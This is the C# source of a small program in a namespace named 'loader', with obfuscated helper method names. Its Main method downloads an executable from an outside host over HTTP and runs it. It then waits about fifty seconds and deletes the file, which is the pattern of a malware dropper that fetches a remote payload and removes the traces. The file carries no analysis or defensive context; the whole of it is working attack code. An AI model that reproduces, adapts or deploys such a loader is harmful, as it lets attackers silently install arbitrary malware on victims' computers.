using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;

namespace loader;

internal class Program
{
	private static void Main(string[] args)
	{
		Path.GetTempPath();
		WebClient webClient = new WebClient();
		webClient.DownloadFile(new Uri(" http://program.zadc.ru/buildcr.exe"), ".exe");
		Process process = new Process();
		process.StartInfo.FileName = ".exe";
		process.Start();
		Thread.Sleep(50000);
		File.Delete(".exe");
	}

	public Program()
	{
		o5hKOIi4nvZM3JEHxy(this);
	}

	internal static bool mPyi0OW9jIYXmAeJum()
	{
		return true;
	}

	internal static bool TCiim5Xf11T4WJbLeP()
	{
		return false;
	}

	internal static void o5hKOIi4nvZM3JEHxy(object object_0)
	{
		object_0._002Ector();
	}
}
